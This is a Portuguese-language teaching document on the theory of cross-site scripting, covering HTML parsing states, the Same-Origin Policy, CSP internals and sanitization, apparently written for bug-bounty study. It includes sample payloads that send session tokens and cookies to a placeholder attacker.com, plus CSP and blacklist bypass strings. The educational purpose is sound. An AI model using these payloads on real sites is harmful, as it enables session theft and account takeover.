# Teoria Fundamental de Cross-Site Scripting (XSS)

**Criticidade**: 🟠 Alta a 🔴 Crítica (CVSS 6.5-9.5)
**Dificuldade**: 🟢 Básica a 🔴 Avançada
**Bounty Médio**: $500 - $20,000 USD

---

## 📚 Índice

1. [Fundamentos Teóricos de XSS](#fundamentos-teóricos-de-xss)
2. [Arquitetura Browser e Parsing HTML](#arquitetura-browser-e-parsing-html)
3. [Same-Origin Policy (SOP)](#same-origin-policy-sop)
4. [Contextos de Execução JavaScript](#contextos-de-execução-javascript)
5. [Content Security Policy Internals](#content-security-policy-internals)
6. [Teoria de Sanitização](#teoria-de-sanitização)

---

## 🔬 Fundamentos Teóricos de XSS

### O Que É XSS em Essência?

**Cross-Site Scripting** é fundamentalmente uma violação da **política de mesma origem** (Same-Origin Policy) que ocorre quando:

1. **Código não confiável é executado no contexto de origem confiável**
2. **Limites entre código e dados são violados no browser**
3. **Parser HTML/JavaScript interpreta dados como código executável**

### Por Que se Chama "Cross-Site"?

**Nomenclatura Histórica (1999):**

O termo "Cross-Site" vem do conceito original:

```
Site A (attacker.com) injeta script em Site B (victim.com)
Script executado em B tem acesso aos dados de B
Mas código veio de A (cross-site)
```

**Modelo Moderno:**

Hoje, XSS geralmente não atravessa sites, mas o nome permaneceu:

```
Atacante → Input malicioso → Aplicação vítima
                                    ↓
                              Armazena/reflete input
                                    ↓
                              Usuário visualiza página
                                    ↓
                              Browser executa script
                                    ↓
                              Script roda no contexto da vítima
```

### XSS como Problema de Injeção de Código

**Similaridade com SQL Injection:**

| Aspecto | SQL Injection | XSS |
|---------|---------------|-----|
| **Linguagem alvo** | SQL | HTML/JavaScript |
| **Parser** | Database engine | Browser |
| **Contexto** | Backend (server) | Frontend (client) |
| **Dados confundidos com** | Sintaxe SQL | Markup/Script |
| **Resultado** | Backend compromise | Client compromise |

**Diferença Fundamental:**

```
SQL Injection:
  Parser: Database (servidor controlado)
  Defesa: Input validation no servidor
  Escopo: Um servidor

XSS:
  Parser: Browser (cliente variado)
  Defesa: Output encoding no servidor
  Escopo: Milhões de browsers diferentes
```

---

## 🌐 Arquitetura Browser e Parsing HTML

### Pipeline de Renderização de Página Web

**Estágios Completos:**

```
1. Network Fetch
   └─> HTTP Request/Response
       └─> Content-Type: text/html

2. HTML Parser (Tokenization)
   └─> Converte bytes → characters → tokens

3. DOM Tree Construction
   └─> Tokens → Nodes → DOM Tree

4. CSS Parser (CSSOM)
   └─> Constrói CSS Object Model

5. Render Tree
   └─> Combina DOM + CSSOM

6. Layout (Reflow)
   └─> Calcula posições/tamanhos

7. Paint
   └─> Renderiza pixels na tela

8. JavaScript Execution
   └─> Modifica DOM/CSSOM (volta ao passo 3)
```

**XSS Acontece no Passo 2-3-8:**

### HTML5 Parser - Finite State Machine

**HTML5 define 80+ estados de parsing:**

```
Estados principais:

1. Data state (texto normal)
2. Tag open state (<)
3. Tag name state (<div)
4. Before attribute name state
5. Attribute name state
6. After attribute name state
7. Before attribute value state
8. Attribute value (double-quoted) state
9. Attribute value (single-quoted) state
10. Attribute value (unquoted) state
11. After attribute value state
12. Script data state (<script>)
13. Script data escaped state
... (70+ more states)
```

**Transições de Estado:**

```
Input: <div class="test">Hello</div>

State transitions:
Data state → Tag open state (<)
           → Tag name state (div)
           → Before attribute name state (space)
           → Attribute name state (class)
           → Before attribute value state (=)
           → Attribute value quoted state ("test")
           → After attribute value state
           → Data state (>)
           → Data state (Hello)
           → Tag open state (<)
           → End tag open state (/)
           → Tag name state (div)
           → Data state (>)
```

**XSS Explora Transições Inesperadas:**

```html
<!-- Desenvolvedor espera: -->
<div>Hello, John</div>

<!-- Atacante injeta: -->
<div>Hello, <script>alert(1)</script></div>

<!-- Parser transitions: -->
Data state (Hello, )
→ Tag open state (<)
→ Tag name state (script)
→ Script data state (alert(1))  ← XSS!
```

**Por que o parser aceita:**
- HTML5 é **extremamente tolerante** a erros
- Parser NUNCA rejeita input (modo "quirks")
- Sempre tenta renderizar algo

### Tokenização e Contextos

**Contextos de Parsing HTML:**

```html
<!-- Contexto 1: HTML Body -->
<div>USER_INPUT</div>
<!-- Parser: Data state -->
<!-- Permitido: Texto, tags HTML -->

<!-- Contexto 2: Atributo -->
<div class="USER_INPUT"></div>
<!-- Parser: Attribute value state -->
<!-- Permitido: Texto, escapes HTML (&quot;) -->

<!-- Contexto 3: Script -->
<script>var x = "USER_INPUT";</script>
<!-- Parser: Script data state -->
<!-- Permitido: JavaScript code -->

<!-- Contexto 4: URL -->
<a href="USER_INPUT">Link</a>
<!-- Parser: Attribute value state + URL validation -->
<!-- Permitido: URLs (http://, javascript:) -->

<!-- Contexto 5: CSS -->
<style>body { color: USER_INPUT; }</style>
<!-- Parser: Style data state -->
<!-- Permitido: CSS values, expression() (IE) -->
```

**Cada contexto tem regras diferentes de escape!**

### DOM Tree Construction

**Como o DOM é construído:**

```html
Input HTML:
<div id="container">
    <p>Hello</p>
    <script>alert(1)</script>
</div>

DOM Tree:
Document
 └─ HTMLDivElement (id="container")
     ├─ HTMLParagraphElement
     │   └─ Text node ("Hello")
     └─ HTMLScriptElement
         └─ Text node ("alert(1)")
```

**Quando script é executado:**

```
1. Parser encontra <script> tag
2. Cria HTMLScriptElement node
3. Adiciona ao DOM
4. Parser PAUSA
5. JavaScript engine executa script
6. Após execução, parser continua
```

**XSS via DOM manipulation:**

```javascript
// JavaScript executando
div.innerHTML = "<img src=x onerror=alert(1)>";

// Browser:
1. Parse string como HTML
2. Cria HTMLImageElement
3. Adiciona ao DOM
4. Image load fails
5. Executa onerror handler ← XSS!
```

---

## 🔒 Same-Origin Policy (SOP)

### Definição Formal de Origem

**Origem = (Scheme, Host, Port)**

```
https://example.com:443/page.html
  ↑       ↑           ↑
scheme   host       port

Origin = (https, example.com, 443)
```

**Comparação de Origens:**

| URL 1 | URL 2 | Same Origin? | Motivo |
|-------|-------|--------------|--------|
| `http://example.com/a` | `http://example.com/b` | ✅ Yes | Mesmo (scheme, host, port) |
| `http://example.com` | `https://example.com` | ❌ No | Scheme diferente |
| `http://example.com:80` | `http://example.com:8080` | ❌ No | Port diferente |
| `http://example.com` | `http://sub.example.com` | ❌ No | Host diferente |
| `http://example.com/a?x=1` | `http://example.com/a?x=2` | ✅ Yes | Query não importa |
| `http://example.com/a#x` | `http://example.com/a#y` | ✅ Yes | Fragment não importa |

### Modelo de Segurança SOP

**Princípio:** Recursos de origem A não podem acessar recursos de origem B

**O Que é Protegido:**

```javascript
// Página em https://site-a.com
var iframe = document.createElement('iframe');
iframe.src = 'https://site-b.com';
document.body.appendChild(iframe);

// Bloqueado pelo SOP:
iframe.contentWindow.document.cookie  // ❌ SecurityError
iframe.contentWindow.localStorage      // ❌ SecurityError
iframe.contentDocument.body.innerHTML  // ❌ SecurityError

// Permitido:
iframe.src = 'https://site-c.com';    // ✅ Pode navegar
iframe.contentWindow.postMessage()     // ✅ Cross-origin messaging
```

**O Que NÃO é Protegido:**

```javascript
// Envio de requests é permitido (CSRF vulnerability)
fetch('https://other-site.com/api/transfer', {
    method: 'POST',
    body: JSON.stringify({to: 'attacker', amount: 1000})
});  // ✅ Request enviado! (mas response bloqueada)

// Leitura de response é bloqueada
fetch('https://other-site.com/api/data')
    .then(r => r.json())  // ❌ CORS error
```

### Como XSS Bypassa SOP

**XSS Executa no Contexto da Origem Vítima:**

```
Normal (SOP protegido):
  attacker.com → tenta acessar → victim.com
  ❌ Bloqueado pelo SOP

XSS:
  attacker.com → injeta script → victim.com
                                     ↓
                              Script executa EM victim.com
                                     ↓
                              Script tem acesso total a victim.com
                                     ↓
                              Envia dados para attacker.com
```

**Analogia:**

```
SOP = Porteiro de prédio
  → Não deixa pessoas de fora entrarem
  → Mas residentes podem sair e voltar

XSS = Atacante se disfarça de residente
  → Porteiro deixa entrar (é da mesma "origem")
  → Uma vez dentro, tem acesso total
```

### Exceções e Relaxamentos de SOP

**document.domain:**

```javascript
// page1.html em https://sub1.example.com
document.domain = 'example.com';

// page2.html em https://sub2.example.com
document.domain = 'example.com';

// Agora podem acessar um ao outro!
// ✅ Same effective origin
```

**CORS (Cross-Origin Resource Sharing):**

```
Servidor diz: "Permito site X acessar meus recursos"

Response header:
Access-Control-Allow-Origin: https://trusted-site.com

Agora trusted-site.com pode ler response
```

---

## 💻 Contextos de Execução JavaScript

### JavaScript Engine Architecture

**V8 Engine (Chrome/Node.js) - Componentes:**

```
1. Parser
   └─> Código JavaScript → AST (Abstract Syntax Tree)

2. Ignition (Interpreter)
   └─> AST → Bytecode
   └─> Execução rápida de código novo

3. TurboFan (Optimizing Compiler)
   └─> Bytecode → Machine code otimizado
   └─> Para código "hot" (executado frequentemente)

4. Orinoco (Garbage Collector)
   └─> Gerenciamento de memória
```

**XSS Execution Flow:**

```javascript
// XSS payload injetado:
<script>alert(document.cookie)</script>

// V8 Pipeline:
1. Parser: "alert(document.cookie)" → AST
2. Ignition: AST → Bytecode
3. Execution:
   - Resolve 'alert' → window.alert (built-in)
   - Evaluate 'document.cookie' → acessa cookies
   - Call alert() com cookies
4. Browser mostra alert dialog
```

### Execution Contexts e Scope Chain

**Execution Context Stack:**

```javascript
// Global Execution Context (bottom of stack)
var globalVar = 'global';

function outer() {
    // Outer Function Execution Context
    var outerVar = 'outer';

    function inner() {
        // Inner Function Execution Context (top of stack)
        var innerVar = 'inner';
        console.log(innerVar);   // ✅ Can access
        console.log(outerVar);   // ✅ Can access (scope chain)
        console.log(globalVar);  // ✅ Can access (scope chain)
    }

    inner();
}

outer();
```

**XSS Acessa Global Scope:**

```javascript
// Página vítima:
<script>
var sessionToken = 'abc123';  // Global scope

function authenticatedAction() {
    // ...
}
</script>

<!-- XSS injetado: -->
<script>
// Executa em mesmo contexto global!
console.log(sessionToken);  // ✅ "abc123"
authenticatedAction();       // ✅ Pode chamar

// Exfiltrar:
fetch('https://attacker.com/steal?token=' + sessionToken);
</script>
```

### Event Loop e Assíncronicidade

**JavaScript Event Loop:**

```
┌─────────────────────────┐
│      Call Stack          │  Funções em execução
└─────────────────────────┘
            ↓
┌─────────────────────────┐
│      Web APIs            │  setTimeout, fetch, DOM events
└─────────────────────────┘
            ↓
┌─────────────────────────┐
│    Callback Queue        │  Callbacks aguardando
└─────────────────────────┘
            ↓
┌─────────────────────────┐
│     Microtask Queue      │  Promises, MutationObserver
└─────────────────────────┘
```

**XSS com Eventos Assíncronos:**

```html
<!-- XSS via image onerror -->
<img src=x onerror="setTimeout(() => fetch('https://attacker.com?cookie=' + document.cookie), 0)">

Execution flow:
1. Image load fails
2. onerror handler adicionado à callback queue
3. Event loop pega callback
4. setTimeout adiciona função ao callback queue
5. fetch() executa assincronamente
6. Cookie enviado para attacker
```

---

## 🛡️ Content Security Policy Internals

### CSP como Whitelist de Recursos

**Conceito:** CSP define políticas de quais recursos podem ser carregados/executados

**Modelo de Enforcement:**

```
Browser carrega página → Lê CSP header → Armazena política

Para cada recurso:
  1. Browser tenta carregar recurso
  2. Verifica contra política CSP
  3. Se permitido → Carrega
  4. Se bloqueado → Bloqueia + console error
```

### CSP Directives - Implementação

**script-src Directive:**

```
CSP: script-src 'self' https://trusted.com

Implementação (pseudo-código):
```

```cpp
// Browser internals (Chromium)
bool CanLoadScript(const GURL& script_url, const CSPPolicy& policy) {
    // Check 'self'
    if (script_url.origin() == document_origin) {
        return true;
    }

    // Check whitelist
    for (const auto& allowed_origin : policy.script_sources) {
        if (script_url.origin() == allowed_origin) {
            return true;
        }
    }

    // Blocked!
    console.error("CSP: Refused to load script from " + script_url);
    return false;
}
```

**Inline Script Blocking:**

```javascript
// HTML:
<script>alert(1)</script>

// Browser CSP check:
if (csp_policy.allows_inline_scripts()) {
    execute_script();
} else {
    // Blocked!
    console.error("CSP: Inline script blocked");
}
```

**Nonce-based CSP:**

```html
<!-- CSP header: -->
Content-Security-Policy: script-src 'nonce-r4nd0m'

<!-- HTML: -->
<script nonce="r4nd0m">
    // Allowed!
</script>

<script nonce="wrong">
    // Blocked!
</script>

<script>
    // Blocked (no nonce)!
</script>
```

**Implementação:**

```cpp
bool CanExecuteInlineScript(const std::string& nonce, const CSPPolicy& policy) {
    // Check if nonce matches
    for (const auto& allowed_nonce : policy.nonces) {
        if (nonce == allowed_nonce) {
            return true;  // Cryptographically verified
        }
    }
    return false;
}
```

### CSP Bypasses - Por Que Acontecem

**Bypass 1: JSONP Endpoints**

```
CSP: script-src 'self' https://trusted-cdn.com

Trusted CDN tem JSONP endpoint:
https://trusted-cdn.com/api?callback=alert

HTML:
<script src="https://trusted-cdn.com/api?callback=alert"></script>

Response:
alert({"data": "..."})  ← Executa alert()!

Por que funciona:
  - URL está na whitelist CSP
  - Conteúdo é JavaScript válido
  - Browser executa sem questionar
```

**Bypass 2: AngularJS + CSP**

```
CSP: script-src 'self'

HTML com AngularJS:
<div ng-app ng-csp>
    {{constructor.constructor('alert(1)')()}}
</div>

Por que funciona:
  - AngularJS processa {{...}} no lado cliente
  - Usa eval() ou Function() internamente
  - CSP não vê como inline script (é processamento de template)
```

**Bypass 3: Service Workers**

```javascript
// CSP: script-src 'self'

// Register service worker (allowed)
navigator.serviceWorker.register('/sw.js');

// sw.js (controlled by attacker):
self.addEventListener('fetch', event => {
    event.respondWith(
        new Response('<script>alert(1)</script>', {
            headers: {'Content-Type': 'text/html'}
        })
    );
});

// Service worker pode servir scripts maliciosos
// Bypassa CSP porque é 'self'
```

---

## 🧪 Teoria de Sanitização

### O Problema da Sanitização Perfeita

**Teorema:** Não existe sanitizador perfeito para HTML arbitrário que:
1. Permite TODO HTML legítimo
2. Bloqueia TODO HTML malicioso
3. Funciona em todos os browsers

**Por quê:**

```
HTML legítimo ∩ HTML malicioso ≠ ∅

Exemplo:
<a href="javascript:alert(1)">Click</a>
  ↑ HTML válido (link funcional)
  ↑ XSS (executa JavaScript)

Dilema: Permitir ou bloquear?
```

### Abordagens de Sanitização

**Abordagem 1: Blacklist**

```python
def sanitize_blacklist(html):
    # Bloqueia padrões conhecidos
    html = html.replace('<script', '')
    html = html.replace('onerror', '')
    html = html.replace('javascript:', '')
    return html

# Bypasses:
# <ScRiPt>
# <img src=x oNerRor=alert(1)>
# <a href="jAvAsCrIpT:alert(1)">
# <scr<script>ipt>  (nested)
```

**Problema:** Lista infinita de padrões maliciosos

**Abordagem 2: Whitelist**

```python
def sanitize_whitelist(html):
    # Permite apenas tags/atributos específicos
    allowed_tags = ['p', 'div', 'span', 'b', 'i']
    allowed_attrs = ['class', 'id']

    # Parse HTML
    tree = parse_html(html)

    # Remove não-whitelisted
    for element in tree:
        if element.tag not in allowed_tags:
            element.remove()
        for attr in element.attrs:
            if attr not in allowed_attrs:
                del element.attrs[attr]

    return serialize(tree)
```

**Problema:** Mutation XSS (re-parsing muda estrutura)

**Abordagem 3: DOMPurify (State-of-the-art)**

```javascript
DOMPurify.sanitize(dirty_html, {
    // Parse HTML usando browser nativo
    RETURN_DOM: true,  // Retorna DOM, não string

    // Whitelist
    ALLOWED_TAGS: ['p', 'b', 'i'],
    ALLOWED_ATTR: ['class'],

    // Hooks para customização
    HOOKS: {
        afterSanitizeAttributes: function(node) {
            // Custom logic
        }
    }
});
```

**Por que DOMPurify funciona melhor:**

1. **Usa parser nativo do browser** (não re-implementa)
2. **Retorna DOM diretamente** (evita re-parsing)
3. **Mutation-aware** (testa round-trips)
4. **Namespace-aware** (SVG, MathML)

### Matemática da Sanitização

**Definição Formal:**

```
Seja H = conjunto de todas strings HTML
Seja S = conjunto de strings HTML seguras
Seja M = conjunto de strings HTML maliciosas

H = S ∪ M  (união)
S ∩ M = ∅  (disjuntos)

Sanitizador ideal:
  sanitize: H → S
  ∀h ∈ H: sanitize(h) ∈ S
```

**Propriedades Desejadas:**

```
1. Safety: ∀h ∈ H, sanitize(h) é seguro
2. Functionality: ∀s ∈ S, sanitize(s) ≈ s (preserva HTML bom)
3. Idempotence: sanitize(sanitize(h)) = sanitize(h)
```

**Realidade:**

```
Nenhum sanitizador satisfaz perfeitamente todas as propriedades:

- Safety 100% → Bloqueia muito HTML legítimo (false positives)
- Functionality 100% → Permite alguns XSS (false negatives)

Trade-off inevitável!
```

---

## 🎯 Modelo de Ameaça XSS

### Classificação por Persistência

**Stored XSS (Mais Perigoso):**

```
Severity: 🔴 Crítica
Persistence: Permanente (database)
Victims: Todos que acessam página
Detecção: Pode passar despercebido por meses
Exploração: Não requer social engineering
```

**Reflected XSS (Perigoso):**

```
Severity: 🟠 Alta
Persistence: Transiente (URL)
Victims: Quem clica no link
Detecção: Logs podem mostrar payload
Exploração: Requer social engineering (phishing)
```

**DOM XSS (Muito Perigoso):**

```
Severity: 🟠 Alta a 🔴 Crítica
Persistence: Transiente
Victims: Quem acessa URL maliciosa
Detecção: Difícil (não aparece em logs de servidor)
Exploração: Pode ser combinado com outros ataques
```

### Impacto por Contexto

**Contexto de Aplicação:**

| Tipo de Site | Impacto de XSS | Risco |
|--------------|----------------|-------|
| **Banking** | Roubo de credenciais, transações fraudulentas | 🔴 Crítico |
| **Social Media** | Account takeover, worms, spam | 🟠 Alto |
| **E-commerce** | Roubo de cartões, pedidos fraudulentos | 🔴 Crítico |
| **Intranet** | Lateral movement, dados corporativos | 🔴 Crítico |
| **Blog pessoal** | Desfiguração, spam | 🟡 Médio |

---

**Última atualização**: 2024
**Versão**: 1.0 - Documento Teórico Fundamental
